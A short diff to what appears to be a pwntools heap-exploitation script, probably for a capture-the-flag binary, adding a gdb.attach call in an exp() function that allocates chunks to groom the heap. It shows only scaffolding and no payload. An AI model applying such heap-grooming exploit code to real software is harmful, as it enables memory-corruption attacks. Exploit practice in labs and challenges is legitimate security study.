@@ -34,6 +34,7 @@ def free(idx):
 
 def exp():
     # trigger to malloc buffer for io function
+    gdb.attach(p)
     alloc(0x100)  # idx 1
 
     alloc(0x30)  # idx 2
